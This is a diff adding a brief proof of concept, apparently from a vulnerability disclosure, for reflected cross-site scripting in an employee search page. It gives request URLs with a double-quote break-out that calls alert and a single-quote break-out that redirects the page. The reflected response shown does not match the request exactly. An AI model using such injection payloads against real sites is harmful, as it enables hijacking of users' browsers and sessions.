@@ -1,0 +1,15 @@
+Proof of Concept
+===================
+Double-Quote String Termination
+HTTP Request =
+https://serverip:port/EmployeeSearch.cc?searchType=contains&searchBy=ALL_FIELDS&searchString=";alert("XSS");//\"
+
+Response Source View
+<script language="javascript">
+var searchValue = "';alert(XSS)//\"";
+
+
+Single-Quote String Termination
+Similarly...
+HTTP Request
+https://serverip:port/EmployeeSearch.cc?searchType=';document.location="http://www.cnn.com";//\"&searchBy=ALL_FIELDS&searchString=BoB
